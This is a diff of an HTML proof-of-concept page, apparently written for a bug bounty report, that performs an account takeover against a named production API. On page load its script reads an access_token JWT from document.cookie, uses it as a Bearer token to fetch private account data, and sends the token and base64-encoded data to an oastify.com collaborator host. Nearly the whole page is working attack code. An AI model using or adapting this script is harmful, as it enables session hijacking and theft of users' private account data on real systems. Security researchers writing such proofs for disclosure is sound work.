@@ -1,56 +1,68 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Critical Security Audit</title>
+    <title>Critical Security Audit - Full ATO PoC</title>
     <style>
-        body { font-family: sans-serif; background: #1a1a1a; color: #00ff00; padding: 50px; }
-        .console { border: 1px solid #333; padding: 20px; background: #000; border-radius: 5px; }
-        .stolen { color: #ff0000; font-weight: bold; }
+        body { font-family: 'Segoe UI', sans-serif; background: #0d1117; color: #c9d1d9; padding: 40px; }
+        .card { background: #161b22; border: 1px solid #30363d; padding: 30px; border-radius: 10px; max-width: 800px; margin: auto; }
+        .stolen { color: #ff7b72; font-family: monospace; background: #0d1117; padding: 10px; border-radius: 5px; overflow-x: auto; display: block; margin-top: 10px; border: 1px solid #444; }
+        .success-msg { color: #3fb950; font-weight: bold; border: 1px solid #3fb950; padding: 10px; text-align: center; border-radius: 5px; }
     </style>
 </head>
 <body>
-    <div class="console">
-        <h2>[!] Account Takeover PoC</h2>
-        <div id="status">Scanning for session...</div>
-        <hr>
-        <p><strong>Stolen JWT:</strong> <span id="token" class="stolen">None</span></p>
-        <p><strong>Stolen Account Data:</strong></p>
-        <pre id="data" class="stolen">None</pre>
+    <div class="card">
+        <h2 style="color: #58a6ff;">[!] Account Takeover (ATO) Practical PoC</h2>
+        <div id="status">Status: Initializing Exploit...</div>
+
+        <p><strong>1. Stolen JWT (Extracted via document.cookie):</strong></p>
+        <code id="jwt-area" class="stolen">Searching for token...</code>
+
+        <p><strong>2. Private Account Data (Exfiltrated via CORS Bypass):</strong></p>
+        <pre id="data-area" class="stolen">Attempting authenticated read...</pre>
     </div>
 
     <script>
-        const target = "https://simplecast-cms-api-gateway.eks.simplecast.com/accounts";
-        const collaborator = "https://2qtjnu0knyyr0fdm4ki4hilualgc43zro.oastify.com";
+        // CONFIGURATION
+        const TARGET_API = "https://simplecast-cms-api-gateway.eks.simplecast.com/accounts";
+        const COLLABORATOR = "https://e3iv06dw0ab3drqyhwvguuy6nxtohfd32.oastify.com"; // <-- UPDATE THIS
 
         async function exploit() {
             try {
-                // 1. Grab token from storage (Bypassing HttpOnly)
+                // STEP 1: Exploit missing HttpOnly flag
+                // We grab the token directly from the browser's cookie storage
                 const cookies = document.cookie;
                 const tokenMatch = cookies.match(/access_token=([^;]+)/);
                 
                 if (tokenMatch) {
                     const jwt = tokenMatch[1];
-                    document.getElementById('token').innerText = jwt;
+                    document.getElementById('jwt-area').innerText = jwt;
 
-                    // 2. Manual Fetch using stolen token (Bypassing SameSite=Lax)
-                    const response = await fetch(target, {
-                        headers: { "Authorization": "Bearer " + jwt }
+                    // STEP 2: Exploit Reflected CORS
+                    // Instead of letting the browser handle cookies (which fails with 401),
+                    // we manually inject the stolen token into the Authorization header.
+                    const response = await fetch(TARGET_API, {
+                        method: "GET",
+                        headers: {
+                            "Authorization": "Bearer " + jwt // Manual hijack
+                        }
                     });
-                    const json = await response.json();
-                    
-                    document.getElementById('data').innerText = JSON.stringify(json, null, 2);
-                    document.getElementById('status').innerText = "FULL EXPLOIT SUCCESSFUL";
 
-                    // 3. Exfiltrate to Attacker Server
-                    fetch(`${collaborator}/?stolen_data=${btoa(JSON.stringify(json))}&token=${jwt}`);
+                    const json = await response.json();
+                    document.getElementById('data-area').innerText = JSON.stringify(json, null, 2);
+                    
+                    document.getElementById('status').innerHTML = "<div class='success-msg'>EXPLOIT SUCCESSFUL: SESSION HIJACKED</div>";
+
+                    // STEP 3: EXFILTRATE DATA
+                    // Send the stolen JWT and the Account Data to our server
+                    fetch(`${COLLABORATOR}/?stolen_jwt=${jwt}&account_info=${btoa(JSON.stringify(json))}`);
                 } else {
-                    document.getElementById('status').innerText = "FAILED: access_token cookie not found.";
+                    document.getElementById('status').innerText = "FAILED: access_token not found in cookies.";
                 }
             } catch (err) {
-                document.getElementById('status').innerText = "Error: " + err.message;
+                document.getElementById('status').innerText = "Fatal Error: " + err.message;
             }
         }
-        exploit();
+        window.onload = exploit;
     </script>
 </body>
 </html>
